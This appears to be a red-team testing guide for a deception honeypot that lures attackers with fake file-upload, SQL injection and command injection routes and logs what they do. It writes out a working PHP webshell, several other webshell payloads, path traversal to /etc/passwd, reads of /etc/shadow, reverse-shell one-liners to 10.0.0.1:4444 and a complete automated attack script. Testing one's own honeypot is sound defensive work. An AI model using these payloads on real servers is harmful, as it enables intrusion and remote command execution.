# 🎯 Attacking the File Upload Vulnerability — Maze Myth Honeypot

> **For testing/red-team purposes only.**  
> This guide documents how to trigger the CVE-2020-36179 deception traps in your own honeypot.

---

## 🔥 Real-App Vulnerability Layer (Start Here)

Before reaching the honeypot's CVE-2020-36179 trap, your IP must first accumulate **100 risk points** so the proxy redirects you. The `real-app` service exposes 6 deliberately vulnerable routes — these are the recommended starting points for any red-team exercise.

| Route | Vulnerability | Points |
|-------|--------------|--------|
| `GET /api/search?q=<payload>` | SQL Injection | **+20** |
| `GET /api/files?path=<payload>` | Path Traversal | **+25** |
| `GET /api/admin/users` | Admin Enumeration | **+20** |
| `POST /api/execute` body `{"cmd":"..."}` | Command Injection | **+40** |
| `POST /api/upload` (webshell `.php`) | Webshell Upload | **+40** |
| `GET /api/account?id=<id>` | IDOR | **+10** |

Every hit logs a `[VULN:TAG]` line to `real_app.log`. Monitor your progress live in the **REAL-APP ATTACKS** tab at `http://localhost:8002` — it shows your IP's risk score bar, attack event feed, and a `🔴 REDIRECT TRIGGERED` marker when you cross 100 points.

**Quick redirect chain (3 requests, ≥ 105 pts):**
```bash
curl -X POST -F "file=@shell.php" http://localhost/api/upload             # +40
curl -X POST -d '{"cmd":"whoami;id"}' http://localhost/api/execute         # +40
curl "http://localhost/api/files?path=../../../../etc/passwd"               # +25 → 105 ✅
```

> See [`EXPLOITATION_GUIDE.md`](../EXPLOITATION_GUIDE.md) and [`docs/ATTACK_REAL_SYSTEM.md`](ATTACK_REAL_SYSTEM.md) for full walkthroughs.

---

## Target Endpoints (CVE-2020-36179 Honeypot Traps)


| Endpoint                                         | Type          | Looks like                  |
| ------------------------------------------------ | ------------- | --------------------------- |
| `GET/POST /api/v2/documents/compliance-upload`   | Spring / Java | Corporate compliance portal |
| `GET/POST /clientportal/support/attachments.php` | PHP / Apache  | Bank client support portal  |
| `GET /uploads/<filename>?cmd=<command>`          | Webshell trap | Uploaded shell execution    |

---

## Step 1 — Reconnaissance

> When using `docker compose -f docker-compose.yaml up -d`, target the attacker-facing proxy on port `80`:
> `http://<honeypot-ip>`
>
> If you run the honeypot manually with `python honeypot.py`, use `http://<honeypot-ip>:8001` instead.

Open a browser or use `curl` to discover the upload forms:

```bash
# Discover Spring endpoint
curl -v http://<honeypot-ip>/api/v2/documents/compliance-upload

# Discover PHP endpoint
curl -v http://<honeypot-ip>/clientportal/support/attachments.php
```

Both return realistic HTML upload forms.  
🔴 **Honeypot logs:** `CVE_SPRING_UPLOAD_FORM` / `CVE_PHP_UPLOAD_FORM`

---

## Step 2 — Upload a Safe File (Baseline)

```bash
# Upload a benign PDF — should succeed silently
curl -X POST \
  -F "file=@report.pdf;filename=report.pdf" \
  -F "ticket_id=TKT-0001" \
  http://<honeypot-ip>/clientportal/support/attachments.php
```

Expected response: `{"status": "uploaded", "filename": "report.pdf", ...}`

> ⚠️ The file is **never written to disk**.  
> The honeypot only pretends to accept it.

🔴 **Honeypot logs:** `CVE_PHP_UPLOAD_SAFE` (MEDIUM severity)

---

## Step 3 — Upload a Webshell Payload

The honeypot **only registers** files whose content contains real webshell code.  
A plain `.php` file with no payload is ignored.

```bash
# Create a real webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via PHP endpoint
curl -v -X POST \
  -F "file=@shell.php;filename=shell.php" \
  -F "ticket_id=TKT-9999" \
  http://<honeypot-ip>/clientportal/support/attachments.php

# Upload via Spring endpoint
curl -X POST \
  -F "file=@shell.php;filename=shell.php" \
  http://<honeypot-ip>/api/v2/documents/compliance-upload
```

Other payload patterns the honeypot detects:

```php
<?php eval(base64_decode('...')); ?>
<?php passthru($_REQUEST['c']); ?>
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

🔴 **Honeypot logs:** `CVE_PHP_WEBSHELL_PAYLOAD` (CRITICAL) — alert fired, filename registered.

---

## Step 4 — Execute Commands via the Webshell Trap

**Only filenames registered in Step 3 work here.**  
Guessing random filenames returns `403 Forbidden`.

```bash
# Basic identity commands
curl "http://<honeypot-ip>/uploads/shell.php?cmd=whoami"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=id"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=uname+-a"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=hostname"

# Recon commands
curl "http://<honeypot-ip>/uploads/shell.php?cmd=ls+-la"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=cat+/etc/passwd"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=cat+/etc/hosts"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=ifconfig"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=ps+aux"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=env"

# Network info
curl "http://<honeypot-ip>/uploads/shell.php?cmd=netstat+-tulpn"
curl "http://<honeypot-ip>/uploads/shell.php?cmd=ss+-tulpn"

# /etc/shadow (returns Permission denied — www-data)
curl "http://<honeypot-ip>/uploads/shell.php?cmd=cat+/etc/shadow"

# Privilege check
curl "http://<honeypot-ip>/uploads/shell.php?cmd=sudo+-l"
```

Expected output: realistic Linux shell responses from `www-data` on `bankcorpweb-02.internal`.

🔴 **Honeypot logs:** `CVE_WEBSHELL_HIT` (CRITICAL) — every `?cmd=` is logged with attacker IP + command.

---

## Step 5 — Attempt Reverse Shell (Detected & Logged)

```bash
# Netcat reverse shell
curl "http://<honeypot-ip>/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261"

# Python reverse shell
curl "http://<honeypot-ip>/uploads/shell.php?cmd=python3+-c+'import+socket,os,pty;...'"

# Perl reverse shell
curl "http://<honeypot-ip>/uploads/shell.php?cmd=perl+-e+'use+Socket;...'"
```

The honeypot simulates a connection timeout (1.5 s delay, empty response).  
🔴 **Honeypot logs:** `CVE_WEBSHELL_HIT` with full reverse-shell payload captured.

---

## Step 6 — Try a Non-Registered Filename (Negative Test)

```bash
# Random filename — should return 403
curl -v "http://<honeypot-ip>/uploads/notmyshell.php?cmd=id"
```

Expected: `HTTP 403 Forbidden` (Apache-style error page, no shell output).

---

## Full Attack Script (Automated)

```bash
#!/bin/bash
HOST="http://localhost"
SHELL_FILE="shell.php"

echo "[1] Checking upload forms..."
curl -s -o /dev/null -w "Spring: %{http_code}\n" $HOST/api/v2/documents/compliance-upload
curl -s -o /dev/null -w "PHP:    %{http_code}\n" $HOST/clientportal/support/attachments.php

echo "[2] Creating webshell payload..."
echo '<?php system($_GET["cmd"]); ?>' > $SHELL_FILE

echo "[3] Uploading via PHP endpoint..."
curl -s -X POST \
  -F "file=@$SHELL_FILE;filename=$SHELL_FILE" \
  -F "ticket_id=TKT-$(shuf -i 1000-9999 -n1)" \
  $HOST/clientportal/support/attachments.php

echo "[4] Running commands via webshell..."
for CMD in whoami id hostname "uname -a" "ls -la" "cat /etc/passwd" "ps aux" ifconfig; do
  echo -n "  \$ $CMD → "
  curl -s "$HOST/uploads/$SHELL_FILE?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$CMD'))")"
  echo
done

echo "[5] Checking dashboard..."
curl -s $HOST/api/dashboard/cve/file-upload | python3 -m json.tool

echo "Done. Check honeypot logs for all captured events."
```

---

## Dashboard — View Captured Events

```bash
curl http://<honeypot-ip>/api/dashboard/cve/file-upload | python3 -m json.tool
```

Fields returned:

| Field | Description |
|-------|-------------|
| `total_events` | All upload trap events |
| `webshell_files` | Filenames with detected payloads |
| `registered_shells` | Filenames active in webshell trap |
| `recent_events` | Last 20 events with IP, tag, timestamp |

---

## What Gets Logged Per Action

| Attacker action | Log tag | Severity |
|----------------|---------|----------|
| View upload form | `CVE_SPRING_UPLOAD_FORM` / `CVE_PHP_UPLOAD_FORM` | INFO |
| Upload safe file | `CVE_PHP_UPLOAD_SAFE` | MEDIUM |
| Upload file with wrong extension only | `CVE_PHP_UPLOAD_DANGEROUS_EXT` | MEDIUM |
| Upload file with webshell **code** | `CVE_PHP_WEBSHELL_PAYLOAD` | **CRITICAL** |
| Execute command via `/uploads/` | `CVE_WEBSHELL_HIT` | **CRITICAL** |
| Access unregistered filename | `CVE_WEBSHELL_NOT_REGISTERED` | MEDIUM |

---

## AI Response Pipeline (What the Attacker Sees)

Commands are resolved via the **Hybrid RAG + LLM** engine:

```
cmd input
    ↓
1. Exact cache (ground-truth — 58 realistic commands)
    ↓ miss
2. Case-insensitive match
    ↓ miss
3. Dynamic handler (echo, cat, grep, ls <path>, reverse-shell detection)
    ↓ miss
4. TF-IDF fuzzy search (Cowrie dataset — 235 real attacker sessions)
    ↓ miss
5. Gemini 2.0 Flash (live generation, cached per session)
    ↓ miss
6. bash: <cmd>: command not found
```

All responses consistent within a session — only restart changes them.
